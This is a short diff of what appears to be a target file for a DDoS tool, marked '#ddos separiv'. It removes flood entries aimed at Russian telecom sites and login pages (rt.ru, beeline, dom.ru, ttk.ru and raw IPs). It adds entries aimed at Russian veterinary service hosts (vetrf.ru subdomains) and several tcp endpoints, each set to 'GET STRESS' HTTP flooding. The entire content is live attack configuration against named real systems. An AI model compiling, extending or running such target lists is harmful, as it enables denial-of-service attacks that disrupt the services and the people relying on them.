@@ -17,10 +17,6 @@ tcp://62.76.148.81:443 tcp://62.76.145.221:443 tcp://62.76.145.203:443 tcp://62.
 
 
 #ddos separiv
-
-https://msk.rt.ru https://b2c.passport.rt.ru/auth https://www.onlime.ru/bonus/rules/ --http-methods GET STRESS
-https://www.ecotelecom.ru https://my.ecotelecom.ru/login?page=/ https://www.akado.ru --http-methods GET STRESS
-https://moskva.beeline.ru/customers/products/ https://moskva.myttk.ru/ --http-methods GET STRESS
-https://msk.dom.ru https://213.59.197.6:443 http://195.166.180.226:80 --http-methods GET STRESS
-https://195.166.180.226:443 https://213.59.197.1:443 https://95.167.23.1:443 --http-methods GET STRESS
-https://193.105.59.18:443 https://79.171.117.93:443 https://b2b.ttk.ru/ --http-methods GET STRESS 
+http://mercury.vetrf.ru https://ivis-sso.vetrf.ru http://assol-express.vetrf.ru --http-methods GET STRESS
+https://argus.vetrf.ru https://vetrf.ru --http-methods GET STRESS
+tcp://62.76.148.81:443 tcp://62.76.145.221:443 tcp://62.76.145.203:443 tcp://62.76.145.81:443
